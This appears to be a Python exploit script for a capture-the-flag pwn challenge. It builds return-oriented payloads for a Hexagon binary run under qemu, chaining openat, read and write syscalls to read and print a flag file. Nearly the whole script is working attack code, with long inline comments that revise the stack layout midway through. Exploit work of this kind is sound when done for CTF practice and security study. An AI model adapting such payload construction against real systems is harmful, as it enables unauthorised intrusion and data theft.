#!/usr/bin/env python3
"""
Exploit v6: handle shifting stack addresses (each restart shifts -0x80).
Stage 1: 0x4080e4c0, Stage 2: 0x4080e440, Stage 3: 0x4080e3c0
"""
import struct, subprocess, os

os.chdir('/data/project/ctf-repo/pwn/nepctf2026/different_rop')

SYS_OPENAT = 56
SYS_READ   = 63
SYS_WRITE  = 64
AT_FDCWD = 0xFFFFFF9C
BSS_BUF  = 0x4bd88
TRAP0    = 0x2ba08
RESTART  = 0x21168

def build_note(base, sysno, r0, r1, r2, r3=0, r4=0, r5=0, flag_str=None):
    """Build a 64-byte calibration note for note buffer at `base`."""
    note = bytearray(64)
    # R30_first = address of note[56] so dealloc_return chain works correctly
    r30_addr = base + 56  # address of note[56]
    # Args: [R30-0x34..R30-0x1C] = [r30_addr-0x34..r30_addr-0x1C] = [base+22..base+40]
    # = note[22]..note[40]
    # But that's messy. Let me use cleaner offsets by putting args at notes[4..28]
    # and adjusting R30_first so that [R30-0x34..R30-0x1C] = notes[4..28]
    # [R30-0x34] = notes[4] → R30-0x34 = base+4 → R30 = base + 0x38
    # But then note[48] = R30_first = base + 0x38, not r30_addr.
    # Recalculate: if R30 = base + 0x38:
    #   [R30-0x34]=notes[4], [R30-0x30]=notes[8], ..., [R30-0x1C]=notes[28]
    #   R30 = base + 0x38 = base + 56. So notes[48] = base + 56.
    #   But [base+56] = notes[56] is where we store the chain!
    # Conflict: notes[48] needs to be base+56, but notes[56] is chain data.

    # Alternative approach: put args at notes[0-28] area
    # [R30-0x34]=notes[0] → R30 = base + 0x34
    # [R30-0x1C]=notes[24] ✓
    # And note[48] = base + 0x34 = R30_first
    # Chain at notes[52-63] works as long as [R30] and [R30+4] = notes[52,56]
    # [R30] = [base+0x34] = notes[52] ✓
    # [R30+4] = [base+0x38] = notes[56] ✓

    R30 = base + 0x34  # Make note[48] = R30, and [R30]=note[52], [R30+4]=note[56]

    # Args at [R30-0x34..R30-0x1C] = [base..base+24] = notes[0..24]
    struct.pack_into('<I', note, 0, r5)     # [R30-0x34] R5
    struct.pack_into('<I', note, 4, r4)     # [R30-0x30] R4
    struct.pack_into('<I', note, 8, r3)     # [R30-0x2C] R3
    struct.pack_into('<I', note, 12, r2)    # [R30-0x28] R2
    struct.pack_into('<I', note, 16, r1)    # [R30-0x24] R1
    struct.pack_into('<I', note, 20, r0)    # [R30-0x20] R0
    struct.pack_into('<I', note, 24, sysno) # [R30-0x1C] R6

    if flag_str:
        note[32:32+len(flag_str)] = flag_str

    # Chain: dealloc_return at 0x215f8 loads from note[48] and note[52]
    # note[48] = R30 (value at byte 48 = base+48), note[52] = TRAP0
    struct.pack_into('<I', note, 48, R30)          # R30_first
    struct.pack_into('<I', note, 52, TRAP0)         # R31_first
    # After trap0, dealloc_return at 0x2ba40 loads from [R30] and [R30+4]
    # [R30] = [base+0x34] = notes[52] = TRAP0 ← WRONG! We want R30_after here.
    # Hmm, this layout puts [R30]=TRAP0, not R30_after.
    # Let me use the original layout where R30_first = note[56]'s address.

    # Actually let me go back to the layout that worked for stage 2:
# R30_first = note[56]'s address = base + 56
# With R30 = base + 56:
#   [R30-0x34] = notes[22], [R30-0x30] = notes[26], ..., [R30-0x1C] = notes[40]
#   Most args span notes[22..40], but some are outside the 64-byte buffer.
#   [R30-0x34] = [base+22] → within note (22 < 64) ✓
#   [R30-0x1C] = [base+40] → within note (40 < 64) ✓
# But we need [R30-0x20] = notes[24] for R0.
#   [R30-0x20] = [base+56-0x20] = [base+36] = notes[36] ← within note ✓

# The arg offsets with R30 = base + 56:
# R5 at notes[22], R4 at notes[26], R3 at notes[30], R2 at notes[34],
# R1 at notes[38], R0 at notes[42]... wait
# [R30-0x34]=[base+22]=notes[22]
# [R30-0x30]=[base+26]=notes[26]
# [R30-0x2C]=[base+30]=notes[30]
# [R30-0x28]=[base+34]=notes[34]
# [R30-0x24]=[base+38]=notes[38]
# [R30-0x20]=[base+42]=notes[42]
# [R30-0x1C]=[base+46]=notes[46]

# But notes[48] is the R30_first value! And note[52] is TRAP0!
# notes[42-47] are between args and chain. That's fine.

# Chain:
# note[48] = R30_first = base + 56
# note[52] = TRAP0
# note[56] = R30_after  (for restart or next chain)
# note[60] = RESTART    (for restart)

# After dealloc_return at 0x215f8:
# R30 = note[48] = base+56, R31 = TRAP0, R29 = base+56
# At trap0: args loaded from [R30-offs] = [base+56-off] = notes[22..46]
# After trap0, dealloc_return at 0x2ba40:
# R29 = base+56
# [R29+0] = notes[56] (at addr base+56) = R30_after ✓
# [R29+4] = notes[60] (at addr base+60) = RESTART ✓
# R29 = R30_after, jumpr RESTART

    # Args at notes[22..46]
    struct.pack_into('<I', note, 22, r5)     # [R30-0x34] R5
    struct.pack_into('<I', note, 26, r4)     # [R30-0x30] R4
    struct.pack_into('<I', note, 30, r3)     # [R30-0x2C] R3
    struct.pack_into('<I', note, 34, r2)     # [R30-0x28] R2
    struct.pack_into('<I', note, 38, r1)     # [R30-0x24] R1
    struct.pack_into('<I', note, 42, r0)     # [R30-0x20] R0
    struct.pack_into('<I', note, 46, sysno)  # [R30-0x1C] R6

    if flag_str:
        note[0:len(flag_str)] = flag_str

    # Chain
    struct.pack_into('<I', note, 48, base + 56)  # R30_first
    struct.pack_into('<I', note, 52, TRAP0)       # R31_first
    struct.pack_into('<I', note, 56, base + 56)   # R30_after (= R30_first for consistency)
    struct.pack_into('<I', note, 60, RESTART)      # R31_after
    return note

# Build notes for each stage with respective base addresses
base1 = 0x4080e4c0
base2 = 0x4080e440
base3 = 0x4080e3c0

note1 = build_note(base1, SYS_OPENAT, AT_FDCWD, base1 + 0x20, 0, flag_str=b'/flag\x00')
# For stage 1: R1 (flag path) = base1 + 0x20 where the flag string is
# But I put the flag string at note[0]! So FLAG_ADDR = base1 + 0 = base1.
# Fix: put flag at a known offset and point R1 there.
# Let me put flag at note[0] = base1. Then R1 = base1.

note1 = build_note(base1, SYS_OPENAT, AT_FDCWD, base1, 0, flag_str=b'/flag\x00')
note2 = build_note(base2, SYS_READ, 3, BSS_BUF, 0x100)
note3 = build_note(base3, SYS_WRITE, 1, BSS_BUF, 0x100)

input_data = b'3\n' + bytes(note1) + b'\n' + b'3\n' + bytes(note2) + b'\n' + b'3\n' + bytes(note3) + b'\n' + b'5\n'

p = subprocess.run(['./qemu-hexagon', '-strace', './pwn'], input=input_data, capture_output=True, timeout=30)

stdout = p.stdout.decode(errors='replace')
stderr = p.stderr.decode(errors='replace')

print(f"STDOUT: {len(stdout)}B  STDERR: {len(stderr)}B\n")
print("=== Syscalls ===")
for line in stderr.split('\n'):
    s = line.strip()
    if any(kw in s for kw in ['openat', 'read(', 'write(', 'SIG', 'exit', 'flag']):
        print(s)

# Search for flag in output
if 'flag' in stdout.lower() or '{' in stdout:
    print("\n*** POSSIBLE FLAG ***")
    for line in stdout.split('\n'):
        if 'flag' in line.lower() or '{' in line or '}' in line:
            print(f"  {line.strip()}")
            if '{' in line: print(f"  >>> THIS LOOKS LIKE THE FLAG: {line.strip()}")
